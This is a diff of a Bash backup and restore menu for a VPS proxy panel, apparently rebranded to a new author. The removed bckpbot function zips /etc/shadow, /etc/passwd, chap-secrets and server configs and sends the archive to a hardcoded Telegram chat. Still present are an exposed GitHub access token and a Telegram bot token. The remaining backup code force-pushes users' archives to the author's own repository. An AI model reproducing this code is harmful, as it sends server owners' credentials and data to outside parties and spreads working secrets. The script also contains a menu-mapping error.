@@ -2,17 +2,17 @@
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 ###########- COLOR CODE -##############
-colornow=$(cat etc/casper/theme/theme/color.conf)
+colornow=$(cat /etc/casper/theme/color.conf)
 export NC="\e[0m"
 export YELLOW='\033[0;33m';
 export RED="\033[0;31m"
-export COLOR1="$(cat etc/casper/theme/theme/$colornow | grep -w "TEXT" | cut -d: -f2|sed 's/ //g')"
-export COLBG1="$(cat etc/casper/theme/theme/$colornow | grep -w "BG" | cut -d: -f2|sed 's/ //g')"
+export COLOR1="$(cat /etc/casper/theme/$colornow | grep -w "TEXT" | cut -d: -f2|sed 's/ //g')"
+export COLBG1="$(cat /etc/casper/theme/$colornow | grep -w "BG" | cut -d: -f2|sed 's/ //g')"
 WH='\033[1;37m'
 ###########- END COLOR CODE -##########
 
 BURIQ () {
-    curl -sS https://raw.githubusercontent.com/Tarap-Kuhing/Profile/main/Profile/main/Tarap-Kuhing > /root/tmp
+    curl -sS https://raw.githubusercontent.com/casper9/permission/main/ipmini > /root/tmp
     data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
     for user in "${data[@]}"
     do
@@ -72,71 +72,7 @@ red "Permission Denied!"
 exit 0
 fi
 clear
-function bckpbot(){
-clear
-IP=$(curl -sS ipv4.icanhazip.com);
-date=$(date +"%Y-%m-%d")
-domain=$(cat /etc/xray/domain)
-clear
-echo -e "[ ${green}INFO${NC} ] Create for database"
-#read -rp "Enter Token (Creat on Botfather) : " -e token
-#read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
-echo -e "toket=5994877932:AAENR9Ir0wmHav6XmZK_kDZQsIT8I7KWRh0" >> /root/botapi.conf
-echo -e "chat_idc=481473615" >> /root/botapi.conf
-sleep 1
-clear
-echo -e "[ ${green}INFO${NC} ] Processing... "
-mkdir -p /root/backup
-sleep 1
 
-cp -r /root/.acme.sh /root/backup/ &> /dev/null
-cp -r /etc/passwd /root/backup/ &> /dev/null
-cp -r /etc/group /root/backup/ &> /dev/null
-cp -r /etc/shadow /root/backup/ &> /dev/null
-cp -r /etc/gshadow /root/backup/ &> /dev/null
-cp -r /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
-cp -r /var/lib/ /root/backup &> /dev/null
-cp -r /etc/xray /root/backup/xray &> /dev/null
-cp -r /root/nsdomain backup/nsdomain &> /dev/null
-cp -r /etc/slowdns backup/slowdns &> /dev/null
-cp -r /etc/nginx/conf.d /root/backup/conf.d/ &> /dev/null
-cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
-cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
-cp -r /etc/crontab /root/backup/crontab &> /dev/null
-cd /root
-zip -r $IP.zip backup > /dev/null 2>&1
-
-curl -F chat_id="847645599" -F document=@"$IP.zip" -F caption="Thank You For Using Our Service
-Your Domain : $domain
-Date       : $date
-Your IP VPS  : $IP" https://api.telegram.org/bot$token/sendDocument &> /dev/null
-
-rm -fr /root/backup &> /dev/null
-rm -fr /root/user-backup &> /dev/null
-rm -f /root/$NameUser.zip &> /dev/null
-rm -f /root/$IP.zip &> /dev/null
-
-echo " Please Check Your Channel"
-echo -e ""
-
-read -n 1 -s -r -p "Press any key to back on menu"
-menu
-}
-function autobckpbot(){
-clear
-cat > /etc/cron.d/bckp_otm <<-END
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-0 5 * * * root /usr/bin/bckp
-END
-service cron restart >/dev/null 2>&1
-service cron reload >/dev/null 2>&1
-
-echo -e "${BIGreen}Auto Backup Start  Daily 05.00 AM${NC} "
-echo -e ""
-read -n 1 -s -r -p "Press any key to back on menu"
-menu
-}
 function backup(){
 clear
 IP=$(curl -sS ipv4.icanhazip.com);
@@ -144,7 +80,7 @@ date=$(date +"%Y-%m-%d")
 
 clear
 echo -e "[ ${green}INFO${NC} ] Create password for database"
-#read -rp "Enter Token (Contact Tarap-Kuhing) : " -e token
+#read -rp "Enter Token (Contact Casper) : " -e token
 read -rp "Enter Name File Your Backup  : " -e NameUser
 read -rp "Enter password : " -e InputPass
 sleep 1
@@ -175,7 +111,7 @@ zip -rP $InputPass $NameUser.zip backup > /dev/null 2>&1
 ##############++++++++++++++++++++++++#############
 LLatest=`date`
 Get_Data () {
-git clone https://github.com/jambanbkn/userbackup.git /root/user-backup/ &> /dev/null
+git clone https://github.com/casper9/userbackup.git /root/user-backup/ &> /dev/null
 }
 
 Mkdir_Data () {
@@ -195,15 +131,15 @@ mv /root/$NameUser.zip /root/user-backup/$NameUser/
 
 Save_And_Exit () {
     cd /root/user-backup
-    git config --global user.email "jambanbkn@gmail.com" &> /dev/null
-    git config --global user.name "jambanbkn" &> /dev/null
+    git config --global user.email "data.mtakbir@gmail.com" &> /dev/null
+    git config --global user.name "casper9" &> /dev/null
     rm -rf .git &> /dev/null
     git init &> /dev/null
     git add . &> /dev/null
     git commit -m $NameUser &> /dev/null
     git branch -M main &> /dev/null
-    git remote add origin https://github.com/jambanbkn/userbackup.git
-    git push -f https://github.com/jambanbkn/userbackup.git &> /dev/null
+    git remote add origin https://github.com/casper9/userbackup.git
+    git push -f https://github.com/casper9/userbackup.git &> /dev/null
 }
 
 if [ ! -d "/root/user-backup/" ]; then
@@ -217,15 +153,17 @@ Input_Data_Append
 sleep 1
 echo -e "[ ${green}INFO${NC} ] Processing updating server...... "
 echo -e ""
-echo -e "$yellow COPY Username GITHUB DI BAWAH INI$NC"
+echo -e "$yellow COPY Username & Apikey GITHUB DI BAWAH INI$NC"
 echo -e""
-echo -e "$yellow Username :👉  jambanbkn  👈$NC"
+echo -e "$yellow Username :👉  casper9  👈$NC"
 echo -e""
-echo -e "$yellow PASTEKAN Username GITHUB DI BAWAH INI$NC"
+echo -e "$yellow Apikey :👉  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  👈$NC"
+echo -e""
+echo -e "$yellow PASTEKAN Username & Apikey GITHUB DI BAWAH INI$NC"
 echo -e ""
 Save_And_Exit
 fi
-link="https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip"
+link="https://raw.githubusercontent.com/casper9/userbackup/main/$NameUser/$NameUser.zip"
 sleep 1
 echo -e "[ ${red}INFO${NC} ] Backup done "
 sleep 1
@@ -261,7 +199,7 @@ function restore(){
 cd
 read -rp "Enter Name File Your Backup  : " -e NameUser
 
-cekdata=$(curl -sS https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip | grep 404 | awk '{print $1}' | cut -d: -f1)
+cekdata=$(curl -sS https://raw.githubusercontent.com/casper9/userbackup/main/$NameUser/$NameUser.zip | grep 404 | awk '{print $1}' | cut -d: -f1)
 
 [[ "$cekdata" = "404" ]] && {
 red "Data not found / you never backup"
@@ -274,7 +212,7 @@ echo -e "[ ${GREEN}INFO${NC} ] • Restore Data..."
 read -rp "Password File: " -e InputPass
 echo -e "[ ${GREEN}INFO${NC} ] • Downloading data.."
 mkdir -p /root/backup
-wget -q -O /root/backup/backup.zip "https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip" &> /dev/null
+wget -q -O /root/backup/backup.zip "https://raw.githubusercontent.com/casper9/userbackup/main/$NameUser/$NameUser.zip" &> /dev/null
 echo -e "[ ${GREEN}INFO${NC} ] • Getting your data..."
 unzip -P $InputPass /root/backup/backup.zip &> /dev/null
 echo -e "[ ${GREEN}INFO${NC} ] • Starting to restore data..."
@@ -322,8 +260,8 @@ sleep 1
 rm -f /root/backup/backup.zip &> /dev/null
 cd
 echo
-read -n 1 -s -r -p "Press any key to certv2ry"
-certv2ray
+read -n 1 -s -r -p "Press any key to menu"
+menu
 }
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
@@ -334,20 +272,16 @@ echo -e " $COLOR1 $NC   ${WH}[${COLOR1}01${WH}]${NC} ${COLOR1}• ${WH}BACKUP VP
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
 echo -e " $COLOR1 $NC   ${WH}[${COLOR1}02${WH}]${NC} ${COLOR1}• ${WH}RESTORE VPS github  $COLOR1 $NC"
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
-echo -e " $COLOR1 $NC   ${WH}[${COLOR1}03${WH}]${NC} ${COLOR1}• ${WH}BACKUP2 VPS  $COLOR1 $NC"
+echo -e " $COLOR1 $NC   ${WH}[${COLOR1}03${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP VPS  $COLOR1 $NC"
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
-echo -e " $COLOR1 $NC   ${WH}[${COLOR1}04${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP2 VPS  $COLOR1 $NC"
+echo -e " $COLOR1 $NC   ${WH}[${COLOR1}04${WH}]${NC} ${COLOR1}• ${WH}BACKUP VPS  $COLOR1 $NC"
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
-echo -e " $COLOR1 $NC   ${WH}[${COLOR1}05${WH}]${NC} ${COLOR1}• ${WH}RESTORE2 VPS  $COLOR1 $NC"
-echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
-echo -e " $COLOR1 $NC   ${WH}[${COLOR1}06${WH}]${NC} ${COLOR1}• ${WH}BACKUP-BOT/TELE VPS  $COLOR1 $NC"
-echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
-echo -e " $COLOR1 $NC   ${WH}[${COLOR1}07${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP-BOT/TELE VPS  $COLOR1 $NC"
+echo -e " $COLOR1 $NC   ${WH}[${COLOR1}05${WH}]${NC} ${COLOR1}• ${WH}RESTORE VPS  $COLOR1 $NC"
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
 echo -e " $COLOR1 $NC   ${WH}[${COLOR1}00${WH}]${NC} ${COLOR1}• ${WH}GO BACK${NC}                              $COLOR1 $NC"
 echo -e " $COLOR1└───────────────────────────────────────────────┘${NC}"
 echo -e "$COLOR1┌────────────────────── ${WH}BY${NC} ${COLOR1}───────────────────────┐${NC}"
-echo -e "$COLOR1 ${NC}                ${WH}• TARAP KUHING •${NC}                 $COLOR1 $NC"
+echo -e "$COLOR1 ${NC}                ${WH}• C A S P E R •${NC}                 $COLOR1 $NC"
 echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
 echo -e ""
 echo -ne " ${WH}Select menu ${COLOR1}: ${WH}"; read opt
@@ -355,11 +289,9 @@ echo -e ""
 case $opt in
 01 | 1) clear ; backup ;;
 02 | 2) clear ; restore ;;
-03 | 3) clear ; backup2 ;;
-04 | 4) clear ; autobackup ;;
-05 | 5) clear ; restore2 ;;
-06 | 6) clear ; bckpbot ;;
-07 | 7) clear ; autobckpbot ;;
+03 | 3) clear ; autobackup ;;
+04 | 4) clear ; backup2 ;;
+04 | 5) clear ; restore2 ;;
 00 | 0) clear ; menu ;;
 *) clear ; menu-backup ;;
 x) exit ;;
